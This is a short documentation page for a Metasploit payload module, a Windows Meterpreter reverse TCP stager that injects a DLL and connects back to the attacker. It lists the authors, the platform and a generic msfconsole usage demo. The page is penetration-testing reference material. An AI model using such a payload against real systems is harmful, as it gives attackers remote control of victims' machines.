## Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)

Inject the meterpreter server DLL (staged). Connect back to 
the attacker (No NX)


## Module Name
payload/windows/patchupmeterpreter/reverse_nonx_tcp

## Authors
* skape
* jt <jt@klake.org>
* vlad902





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_nonx_tcp
msf payload(reverse_nonx_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_nonx_tcp) > set TARGET <target-id>
msf payload(reverse_nonx_tcp) > show options
   ... show and set options ...
msf payload(reverse_nonx_tcp) > run
```
    
    